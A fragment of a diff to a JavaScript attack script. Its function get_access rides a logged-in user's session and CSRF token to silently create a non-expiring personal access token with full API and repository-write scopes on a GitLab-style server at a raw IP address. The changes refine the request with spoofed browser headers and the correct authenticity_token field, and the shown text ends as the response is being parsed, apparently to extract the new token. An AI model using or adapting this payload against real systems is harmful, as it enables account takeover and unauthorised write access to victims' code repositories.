@@ -14,9 +14,18 @@ function get_final() {
 
 function get_access(token) {
   fetch("https://65.52.77.188/-/profile/personal_access_tokens", {
-  "body": "X-CSRF-Token="+ encodeURI(token) + "&personal_access_token%5Bname%5D=full&personal_access_token%5Bexpires_at%5D=&personal_access_token%5Bscopes%5D%5B%5D=api&personal_access_token%5Bscopes%5D%5B%5D=write_repository",
+        "credentials": "include",
+    "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:89.0) Gecko/20100101 Firefox/89.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Accept-Language": "sv-SE,sv;q=0.8,en-US;q=0.5,en;q=0.3",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Upgrade-Insecure-Requests": "1"
+    },
+    "referrer": "https://65.52.77.188/-/profile/personal_access_tokens",
+  "body": "authenticity_token="+ encodeURI(token) + "&personal_access_token%5Bname%5D=full&personal_access_token%5Bexpires_at%5D=&personal_access_token%5Bscopes%5D%5B%5D=api&personal_access_token%5Bscopes%5D%5B%5D=write_repository",
   "method": "POST",
-  "credentials": "include"
+  "mode": "cors"
 }).then(response => response.text())
   .then(text => {
     const parser = new DOMParser();
